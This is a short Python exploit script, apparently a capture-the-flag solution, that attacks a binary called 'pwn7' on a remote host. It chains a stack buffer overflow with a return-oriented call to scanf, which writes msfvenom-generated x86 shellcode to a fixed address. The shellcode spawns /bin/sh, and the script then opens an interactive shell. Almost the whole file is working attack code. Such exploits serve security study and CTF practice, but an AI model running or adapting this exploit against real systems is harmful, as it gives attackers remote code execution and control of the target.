#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-05-13 23:26:33
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils,os,time
from pwn import *
context(log_level="debug")
DEBUG = 0
target = "./pwn7"
remote_ip = "192.168.5.84"
port = 8888
rop = roputils.ROP(target)
# msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python
buf =  ""
buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"
buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"
buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"
buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"
buf += "\xfd\x10\xf9"


# bss = rop.section('.bss')
# rop.got('puts')
# rop.call('read', 0, addr_bss, 0x100)
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'


if DEBUG:
	p = process(target,env={"LD_LIBRARY_PATH":sys.path[0]})
	# gdb.attach(p,"b*0x8048A47\nc")
else:
	p = remote(remote_ip,port)

def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)


ru("\n\n\n")
payload = "\x00"*(0x1f4 +0xc)
payload += rop.call('__isoc99_scanf', 0x08048CCA,0x08049AA4) +p32(0x08049AA4)
sl(payload)

sl(buf)

p.interactive()